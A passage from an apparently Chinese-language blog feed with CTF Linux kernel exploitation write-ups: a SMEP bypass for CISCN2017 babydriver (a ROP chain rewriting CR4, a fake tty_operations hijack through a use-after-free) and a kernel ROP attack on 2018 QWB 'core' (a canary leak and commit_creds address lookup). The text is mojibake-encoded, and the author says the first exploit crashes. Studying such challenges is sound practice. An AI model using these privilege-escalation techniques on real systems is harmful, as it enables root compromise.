<h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><h3 id="Book"><a href="#Book" class="headerlink" title="Book"></a>Book</h3><h3 id="Audio-x2F-Video"><a href="#Audio-x2F-Video" class="headerlink" title="Audio&#x2F;Video"></a>Audio&#x2F;Video</h3><h3 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h3><h3 id="github"><a href="#github" class="headerlink" title="github"></a>github</h3><h3 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h3><h2 id="Linux-Kernel-Pwn"><a href="#Linux-Kernel-Pwn" class="headerlink" title="Linux Kernel Pwn"></a>Linux Kernel Pwn</h2><h2 id="Command-Line"><a href="#Command-Line" class="headerlink" title="Command Line"></a>Command Line</h2>]]></content>
      <categories>
        <category>é˜…è¯»ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ¨è</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF linux kernel pwn 0 ä¹‹ kernel bypass-smep</title>
    <url>/2022/05/12/CTF-linux-kernel-pwn-0-%E4%B9%8B-kernel-bypass-smep/</url>
    <content><![CDATA[<h3 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>

<p>æœ¬æ–‡ä¸»è¦å­¦ä¹  Kernel bypass-smep åˆ©ç”¨æ–¹å¼<br>é¢˜ç›®ä»¥ CISCN2017 - babydrive ä¸ºä¾‹</p>
<h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>æœ¬é¢˜ä¸»è¦å¼€å¯äº† SMEP å¯ä»¥é˜²æ­¢å†…æ ¸æ€è®¿é—®ç”¨æˆ·ç©ºé—´ä»£ç </p>
<p>é€†å‘ä¼ªä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babydriver_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret =  alloc_chrdev_region(<span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;babydev&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>(ret &lt;<span class="number">0</span>)</span><br><span class="line">        printk(<span class="string">&quot;alloc chrdev region failed&quot;</span>)</span><br><span class="line">    cdev_init()</span><br><span class="line">    ret = cdev_add(babydev_no, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> ret &gt;= <span class="number">0</span></span><br><span class="line">        v5 = _class_create(<span class="string">&quot;babydev&quot;</span>, &amp;babydev_no)</span><br><span class="line">        <span class="keyword">if</span> (!v5)</span><br><span class="line">            printk(<span class="string">&quot;create class failed&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            v7 = device_create(v5, <span class="number">0</span>, babydev_no, <span class="number">0</span>, <span class="string">&quot;babydev&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> !v7</span><br><span class="line">                printk(<span class="string">&quot;create devive failed&quot;</span>)</span><br><span class="line">                class_destroy(babydev_class)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        cdev_del()</span><br><span class="line">    printk(<span class="string">&quot;cdev init failed&quot;</span>)</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> babydriver_exit()</span><br><span class="line">&#123;</span><br><span class="line">    device_destroy(babydev_class, babydev_no);</span><br><span class="line">    class_destroy(babydev_class)</span><br><span class="line">    cdev_del(&amp;cdev_0);</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int64 <span class="title function_">babyioctl</span><span class="params">(file* filp, <span class="type">unsigned</span> <span class="type">int</span> command, <span class="type">unsigned</span> int64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> command == <span class="number">10001</span>h</span><br><span class="line">        kfree(babydev_strcut.device_buf);</span><br><span class="line">        device_buf = kmalloc(arg, <span class="number">0x24000C0</span>)</span><br><span class="line">        device_buf_len = arg</span><br><span class="line">        printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        printk(<span class="string">&quot;args:   &quot;</span>)</span><br><span class="line">        result = <span class="number">-22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babyopen</span><span class="params">(inode *inode, file* filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    babyddev_strcut.device_buf = kmalloc(<span class="number">0x24000C0</span>L, <span class="number">64LL</span>)</span><br><span class="line">    babydev_struct.device_buf_len = <span class="number">64</span></span><br><span class="line">    printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">babyrelease</span><span class="params">(inode *inode, file * filp)</span></span><br><span class="line">&#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    printk(<span class="string">&quot;device release\n&quot;</span>, filp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ssize_t</span> <span class="title function_">babyread</span><span class="params">(file *filp, <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span> (!babydev_struct.device_buf)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; length)</span><br><span class="line">        retVal = length</span><br><span class="line">        copy_to_user(buffer);</span><br><span class="line">        result = retVal;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">babywrite</span><span class="params">(file *filp, <span class="type">const</span> <span class="type">char</span> *buffer, <span class="type">size_t</span> length, <span class="type">loff_t</span> *offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!babydev_struct.device_buf)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2</span>;</span><br><span class="line">    <span class="keyword">if</span> (babydev_strcut.device_buf_len &gt; length)</span><br><span class="line">        retVal = length</span><br><span class="line">        copy_from_user();</span><br><span class="line">        result = retVal;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ¬é¢˜å†…æ ¸ç‰ˆæœ¬ä¸º 4.4.72ï¼Œæ˜¯èƒ½å¤Ÿé€šè¿‡ç›´æ¥åŠ«æŒ cred ç»“æ„ä½“è¿›è¡Œè§£å†³ï¼Œä½†æ˜¯å¦‚æœå†…æ ¸ç‰ˆæœ¬æå‡ï¼Œå°±æ— æ³•ç›´æ¥è¿›è¡ŒåŠ«æŒï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘ç»•è¿‡ smep åœ¨è¿›è¡Œ ROP æ“ä½œ</p>
<p>ä¸»è¦ç»•è¿‡å’ŒROPä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"><span class="type">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>) get_root;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>; <span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>; <span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>) get_shell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fake_tty_operations[i] = <span class="number">0xffffffff8181bfc5</span>; <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line">    &#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>; <span class="comment">//pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="type">size_t</span>) rop; </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">    <span class="type">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_tty_operations;</span><br><span class="line">    write(fd2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//char buf[8] = &#123;0&#125;;</span></span><br><span class="line">    write(fd_tty, <span class="string">&quot;hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ä»ç»“æœæ¥çœ‹æ²¡æœ‰è¾¾åˆ°ç†æƒ³ï¼Œè¿è¡Œç»“æœå¦‚ä¸‹</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">./exp1</span><br><span class="line">[*] Start to exploit...</span><br><span class="line">[*]status has been saved.</span><br><span class="line">[    5.575253] device open</span><br><span class="line">[    5.576199] device open</span><br><span class="line">[    5.577136] alloc done</span><br><span class="line">[    5.578029] device release</span><br><span class="line">[    5.579662] traps: exp1[91] general protection ip:40fbe6 sp:7ffc206211d8 error:0 in exp1[400000+b7000]</span><br><span class="line">[    5.582778] exp1[90]: segfault at 7ffc206213d0 ip 00007ffc206213d0 sp 00007ffc20621388 error 15</span><br><span class="line">[    5.585234] device release</span><br><span class="line">[    5.586091] bad magic number for tty struct (5:2) in tty_release</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡è°ƒè¯•çŸ¥é“åœ¨ swapgs ä¹‹å pop rbp ä¼šæŠ¥é”™ï¼Œä½†æ˜¯è‡³ä»Šæ²¡æœ‰æ‰¾å‡ºæ¥ä¸ºä»€ä¹ˆä¼šé”™</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF linux kernel pwn 0 ä¹‹ Kernel ROP</title>
    <url>/2022/05/10/CTF-linux-kernel-pwn-0-%E4%B9%8B-Kernel-ROP/</url>
    <content><![CDATA[<span id="more"></span>

<h3 id="ç³»ç»Ÿç¯å¢ƒ"><a href="#ç³»ç»Ÿç¯å¢ƒ" class="headerlink" title="ç³»ç»Ÿç¯å¢ƒ"></a>ç³»ç»Ÿç¯å¢ƒ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HOST OS Platform: macOS</span><br><span class="line">HOST OS Version: 10.15</span><br><span class="line">è™šæ‹Ÿæœºè½¯ä»¶ï¼šVMware Fusion 12</span><br><span class="line">OS Platform:  Linux Ubuntu</span><br><span class="line">OS Version: 18.04</span><br></pre></td></tr></table></figure>

<p>æœ¬æ–‡ä¸»è¦å­¦ä¹  Kernel ROP åˆ©ç”¨æ–¹å¼<br>é¢˜ç›®ä»¥ 2018 å¼ºç½‘æ¯ core ä¸ºä¾‹</p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>è·å–é¢˜ç›®è§£å‹åï¼ŒæŸ¥çœ‹æ–‡ä»¶ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// start.sh</span><br><span class="line">kaslr</span><br><span class="line"></span><br><span class="line">// bzImage </span><br><span class="line">kernel  version  = 4.15.8</span><br><span class="line"></span><br><span class="line">// core.cpio/init</span><br><span class="line"><span class="built_in">cat</span> /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"></span><br><span class="line">// core.cpio/core.ko</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br></pre></td></tr></table></figure>

<h3 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h3><p><strong>init_module</strong><br>åœ¨ &#x2F;proc ç›®å½•ä¸‹åˆ›å»ºè™šæ‹Ÿæ–‡ä»¶ core ä»¥åŠè™šæ‹Ÿæ–‡ä»¶å¯¹åº”çš„æ“ä½œï¼Œ0x1B6 å³ 0666, è¡¨ç¤ºä¸ºæ™®é€šæ–‡ä»¶ï¼Œæ“ä½œæƒé™ 666</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">0x1B6</span>LL, <span class="number">0LL</span>, &amp;core_ops);</span><br><span class="line">	printk(<span class="string">&quot;create /proc/core entry&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>exit_module</strong><br>åˆ é™¤è™šæ‹Ÿæ–‡ä»¶ core</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (core_proc)</span><br><span class="line">		result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_release</strong><br>åœ¨æ–‡ä»¶åˆ é™¤æ—¶æ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_release</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(<span class="string">&quot;core: release&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_write</strong><br>ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶ä¸è¶…è¿‡ 0x800 å­—èŠ‚çš„æ•°æ®</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_write</span><span class="params">(<span class="type">int</span> a1, _user <span class="type">char</span> * buf, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;core: called core_writen&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, buf, len))</span><br><span class="line">        <span class="keyword">return</span> len;</span><br><span class="line">    printk(<span class="string">&quot;core: error copying data from userspacen&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>core_read</strong><br>ä» v5[off] æ‹·è´ 64 å­—èŠ‚æ•°æ®åˆ°ç”¨æˆ·ç©ºé—´</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    printk(<span class="string">&quot;core: called core_read&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;%d %p&quot;</span>);</span><br><span class="line">    result = copy_to_user(v1, (<span class="type">char</span> *)&amp;v5 + off, <span class="number">64LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">        <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_copy_func</strong><br>å¤åˆ¶å‡½æ•°ï¼Œä» name å¤åˆ¶æ•°æ®åˆ° v2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    v3 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">    printk(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (a1 &gt; <span class="number">63</span>)</span><br><span class="line">        printk(<span class="string">&quot;Detect Overflow&quot;</span>)</span><br><span class="line">        result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        result = <span class="number">0LL</span>;</span><br><span class="line">        qmemcpy(&amp;v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>core_ioctl</strong><br>ioctlå®ç°ä¸‰ä¸ªåŠŸèƒ½</p>
<ul>
<li>ä»å†…æ ¸ç©ºé—´å¤åˆ¶ä¿¡æ¯åˆ°ç”¨æˆ·ç©ºé—´ read</li>
<li>ä»å…¨å±€å˜é‡ name å¤åˆ¶å†…å®¹åˆ°æ ˆä¸è¶…è¿‡ 64 å­—èŠ‚</li>
<li>ä¿®æ”¹å…¨å±€åç§»ä¿¡æ¯ off<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">core_ioctl</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> cmd, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">switch</span> cmd</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">			core_read(a3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">			printk(<span class="string">&quot;core %d&quot;</span>, );</span><br><span class="line">			off = a3;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">			printk(<span class="string">&quot;core: called core copy&quot;</span>);</span><br><span class="line">			core_copy_func(a3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><ol>
<li>æ³„æ¼ Canary</li>
<li>æ„é€ ROPé“¾</li>
<li>å¸ƒç½®ROPé“¾</li>
</ol>
<p><strong>æ³„æ¼ Canary</strong><br>é¦–å…ˆé€šè¿‡ core_read å’Œ off æ³„æ¼ canary</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] read to buf\n&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *) buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] canary: %p&quot;</span>, canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°ç»“æœ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/ $ ./exp</span><br><span class="line">[*] <span class="built_in">set</span> off to 64</span><br><span class="line">[*] <span class="built_in">read</span> to buf</span><br><span class="line">[*] canary: 0xbb6f283435b8c000</span><br></pre></td></tr></table></figure>

<p><strong>æ„é€ åˆå§‹ROPé“¾</strong><br>ROPé“¾éœ€è¦é€šè¿‡ gadget è¿”å›æ‰§è¡Œ <code>commit_cred(prepare_kernel_creds(0))</code></p>
<ul>
<li>å¦‚ä½•è·å– <code>commit_cred()</code> <code>prepare_kernel_cred()</code> å‡½æ•°åœ°å€<br>æœ¬é¢˜ä¸­å°†è™½ç„¶å¼€å¯äº† kptrï¼Œä½†æ˜¯å¯åŠ¨è¿‡ç¨‹ä¸­å°† <code>/proc/kallsyms</code> å¤åˆ¶åˆ° <code>/tmp/kallsyms</code> å¯ä»¥ç›´æ¥è¿›è¡Œè¯»å–</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span> <span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="number">22</span> </span><br><span class="line"><span class="number">23</span> <span class="type">size_t</span> <span class="title function_">find_func</span><span class="params">()</span></span><br><span class="line">24 &#123;</span><br><span class="line"><span class="number">25</span>         FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="number">26</span>         <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">27</span>         &#123;</span><br><span class="line"><span class="number">28</span>                 <span class="built_in">printf</span>(<span class="string">&quot;[*] open kallsyms error!\n&quot;</span>);</span><br><span class="line"><span class="number">29</span>                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">30</span>         &#125;</span><br><span class="line"><span class="number">31</span> </span><br><span class="line"><span class="number">32</span>         <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">33</span>         <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line"><span class="number">34</span>         &#123;</span><br><span class="line"><span class="number">35</span>                 <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line"><span class="number">36</span>                         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">37</span> </span><br><span class="line"><span class="number">38</span>                 <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line"><span class="number">39</span>                 &#123;</span><br><span class="line"><span class="number">40</span>                         <span class="type">char</span> hex[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">41</span>                         <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line"><span class="number">42</span>                         <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line"><span class="number">43</span>                         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line"><span class="number">44</span>                 &#125;</span><br><span class="line"><span class="number">45</span> </span><br><span class="line"><span class="number">46</span>                 <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cr    ed)</span><br><span class="line"><span class="number">47</span>                 &#123;</span><br><span class="line"><span class="number">48</span>                         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="number">49</span>                         <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line"><span class="number">50</span>                         <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line"><span class="number">51</span>                         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_ker    nel_cred);</span><br><span class="line"><span class="number">52</span>                 &#125;</span><br><span class="line"><span class="number">53</span>         &#125;</span><br><span class="line"><span class="number">54</span> </span><br><span class="line"><span class="number">55</span>         <span class="keyword">if</span> (!(commit_creds &amp; prepare_kernel_cred))</span><br><span class="line"><span class="number">56</span>         &#123;</span><br><span class="line"><span class="number">57</span>                 <span class="built_in">printf</span>(<span class="string">&quot;[*] Error!&quot;</span>);</span><br><span class="line"><span class="number">58</span>                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="number">59</span>         &#125;</span><br><span class="line"><span class="number">60</span> &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>å¦‚ä½•è·å– gadget<br>  å¯ä»¥ä½¿ç”¨ ropper ç›´æ¥ä¿å­˜æ‰€æœ‰ gadget<br>  ropper â€“file .&#x2F;vmlinux â€“nocolor &gt; g1<br>  ROPgadget â€“binary .&#x2F;vmlinux &gt; g2</p>
</li>
<li><p>å¦‚ä½•è·å– gadget åœ°å€<br>  å¼€å¯ kaslr åå†…æ ¸åŠ è½½åœ°å€å°†ä¼šå˜åŒ–ï¼Œä½†æ˜¯åŠ è½½åç§»ä¸ä¼šå˜åŒ–</p>
